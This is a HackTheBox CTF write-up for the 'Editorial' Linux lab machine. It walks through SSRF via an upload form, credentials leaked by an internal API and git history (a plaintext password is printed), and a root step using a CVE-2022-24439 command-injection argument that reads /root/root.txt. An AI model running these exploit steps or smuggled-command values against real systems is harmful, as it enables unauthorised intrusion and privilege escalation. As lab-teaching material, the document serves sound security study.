---
title: Editorial Writeup - HackTheBox
date: 2024-06-09
categories:
    - Writeups
    - HTB
tags:
    - Linux
    - HTB
    - CTF
    - Easy
    - Seasonal
img_path: /assets/img/commons/editorial/
image: editorial.png
---

Hello!

In this write-up, we will dive into the **HackTheBox** seasonal machine [Editorial](https://app.hackthebox.com/machines/Editorial).
It is a **Linux** machine on which we will carry out a **SSRF attack** that will allow us to gain access to the system via SSH.

Then, we will proceed to do an **user pivoting** and then, as always, a **Privilege Escalation**. 

Let's go!

## Active recognition
---

As a first step, we will execute the `ping` command to verify that the target machine is active and we will add the machine IP to our `/etc/hosts` file:

```bash
ping -c 1 10.129.1.176
```

```bash
sudo nano /etc/hosts 
```

## Port scanning
---

Next, we run a scan with `nmap` to identify open ports on the target machine.

```bash
nmap -p- --open -sS --min-rate 5000 -vvv 10.129.1.176 -oG allPorts
```

![nmap](nmap_allPorts.png)

The only open ports that we see are 80 (HTTP server) and 22 (SSH), we can see more information of the services by executing:

```bash
nmap -sCV 22,80 10.129.1.176 -oN targeted -oX targetedXML
```

![nmap_targeted](nmap_targeted.png)


## Exploitation
---

If we open the IP address in firefox, we can see the following website:

![home](home.png)

we don't see anything interesting, so we go to the _publish with us_ section:

![upload](upload.png)

After sending the request from this page and observing it with burpsuite, I was able to identify that this page could be susceptible to SSRF attack so I tried to do something like this: In the url requested in the form we have put our localhost with port 5000 (`127.0.0.1:5000`) and for the image, we have opened an http server with python in a folder in which we had any photo, as always:

```bash
python -m http.server 5000
```

and I put the image name in the form.

After clicking on the preview button, we get the request with burpsuite and we see this:

![upload_cover](upload_cover.png)

We make a new request to this new endpoint, and get it again with burpsuite:

![user_endpoint](user_endpoint.png)

We see that the server response shows us several endpoints, the endpoint `/api/latest/metadata/messages/authors` seems to be interesting.

Let's make a new request:

![api_call](api_call.png)

we get this new response with burpsuite:

![user_creds](ssh_credentials.png)

We can now access to the machine via SSH as the user **dev**, and get the user flag:

![ssh1](ssh_connect.png)

![user_flag](user_flag.png)

<br>

## User pivoting
---
Trying to escalate privileges, we access the apps folder where we find a .git folder, inside we find some logs that allow us to see the old commits on the directory. After reviewing all the logs, we found an interesting one:

```
commit 1e84a036b2f33c59e2390730699a488c65643d28
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:51:10 2023 -0500

    feat: create api to editorial info
    
    * It (will) contains internal info about the editorial, this enable
       faster access to information.

diff --git a/app_api/app.py b/app_api/app.py
new file mode 100644
index 0000000..61b786f
--- /dev/null
+++ b/app_api/app.py
@@ -0,0 +1,74 @@
+# API (in development).
+# * To retrieve info about editorial
+
+import json
+from flask import Flask, jsonify
+
+# -------------------------------
+# App configuration
+# -------------------------------
+app = Flask(__name__)
+
+# -------------------------------
+# Global Variables
+# -------------------------------
+api_route = "/api/latest/metadata"
+api_editorial_name = "Editorial Tiempo Arriba"
+api_editorial_email = "info@tiempoarriba.htb"
+
+# -------------------------------
+# API routes
+# -------------------------------
+# -- : home
+@app.route('/api', methods=['GET'])
+def index():
+    data_editorial = {
+        'version': [{
+            '1': {
+                'editorial': 'Editorial El Tiempo Por Arriba', 
+                'contact_email_1': 'soporte@tiempoarriba.oc',
+                'contact_email_2': 'info@tiempoarriba.oc',
+                'api_route': '/api/v1/metadata/'
+            }},
+            {
+            '1.1': {
+                'editorial': 'Ed Tiempo Arriba', 
+                'contact_email_1': 'soporte@tiempoarriba.oc',
+                'contact_email_2': 'info@tiempoarriba.oc',
+                'api_route': '/api/v1.1/metadata/'
+            }},
+            {
+            '1.2': {
+                'editorial': api_editorial_name, 
+                'contact_email_1': 'soporte@tiempoarriba.oc',
+                'contact_email_2': 'info@tiempoarriba.oc',
+                'api_route': f'/api/v1.2/metadata/'
+            }},
+            {
+            '2': {
+                'editorial': api_editorial_name, 
+                'contact_email': 'info@tiempoarriba.moc.oc',
+                'api_route': f'/api/v2/metadata/'
+            }},
+            {
+            '2.3': {
+                'editorial': api_editorial_name, 
+                'contact_email': api_editorial_email,
+                'api_route': f'{api_route}/'
+            }
+        }]
+    }
+    return jsonify(data_editorial)
+
+# -- : (development) mail message to new authors
+@app.route(api_route + '/authors/message', methods=['GET'])
+def api_mail_new_authors():
+    return jsonify({
+        'template_mail_message': "Welcome to the team! We are thrilled to have 
you on board and can't wait to see the incredible content you'll bring to the ta
ble.\n\nYour login credentials for our internal forum and authors site are:\nUse
rname: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your p
assword as soon as possible for security purposes.\n\nDon't hesitate to reach ou
t if you have any questions or ideas - we're always here to support you.\n\nBest
 regards, " + api_editorial_name + " Team."
+    }) # TODO: replace dev credentials when checks pass
+
+# -------------------------------
+# Start program
+# -------------------------------
+if __name__ == '__main__':
+    app.run(host='127.0.0.1', port=5001, debug=True)
```

We found the credentials of the **prod** user, we access again via SSH as this user. 

<br>

## Privilege escalation
---

Now, as the user prod, we are able to run the command `sudo -l` to try to find superuser processes that we can run as the user prod:

![sudo-l](sudo-l.png)

We find that we can execute the command `python3 /opt/internal_apps/clone_changes/clone_prod_change.py`, but we can't modify the python file.

After some research, we found the vulnerability [CVE-2022-24439](https://www.cvedetails.com/cve/CVE-2022-24439/), so we can try to get the root flag by executing the following:

```bash
python3 /opt/internal_apps/clone_changes/clone_prod_change.py "ext::sh -c cat% /root/root.txt% >% /home/prod/root.txt"
```

We can now access the `root.txt` file, and we have the root flag.


> H4Ppy H4ck1ng!
